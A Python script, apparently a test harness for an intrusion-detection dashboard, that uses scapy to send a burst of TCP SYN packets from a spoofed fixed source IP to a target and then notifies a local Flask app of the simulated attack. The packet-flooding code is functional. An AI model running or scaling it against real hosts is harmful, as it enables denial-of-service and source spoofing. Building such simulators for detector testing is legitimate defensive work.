from scapy.all import IP, TCP, send
import time
import random

def simulate_syn_flood(target_ip="192.168.1.1", count=100):
    """
    Simulates SYN flooding by sending many SYN packets.
    """
    print(f"[*] Starting SYN Flood Simulation...")
    print(f"[*] Target: {target_ip}")
    print(f"[*] Sending {count} SYN packets...")
    
    # Use a FIXED source IP to trigger the per-IP flood detector
    # Random IPs (DDoS simulation) won't trigger the simple DoS detector which tracks per-IP count
    src_ip = "10.0.0.5" 
    
    print(f"[*] Simulating attack from single source: {src_ip}")
    
    for i in range(count):
        src_port = random.randint(1024, 65535)
        
        pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=80, flags="S")
        send(pkt, verbose=False)
        
        if i % 20 == 0:
            print(f"  Sent {i} packets...")
        
        # Send fast enough to exceed threshold (packets/sec)
        time.sleep(0.01)
        
    print(f"[*] Sent {count} packets.")
    print("[*] Check dashboard for 'SYN Flood' alert/stats.")

    # Notify running Flask app so its in-memory stats are updated immediately
    try:
        import json, urllib.request
        payload = {
            'attack_type': 'SYN Flood (Simulation)',
            'severity': 'HIGH',
            'source_ip': src_ip,
            'source_mac': None,
            'destination_ip': target_ip,
            'details': f"Simulated SYN flood: {count} SYN packets from {src_ip} to {target_ip}"
        }
        req = urllib.request.Request(
            'http://127.0.0.1:5000/api/sim/notify',
            data=json.dumps(payload).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        with urllib.request.urlopen(req, timeout=3) as resp:
            body = resp.read().decode('utf-8')
            print(f"[SIM] Notified Flask app: {body}")
    except Exception as e:
        print(f"[SIM] Warning: could not notify Flask app: {e}")

if __name__ == "__main__":
    try:
        simulate_syn_flood()
    except PermissionError:
        print("[!] Error: You need to run this as Administrator/Root to send packets.")
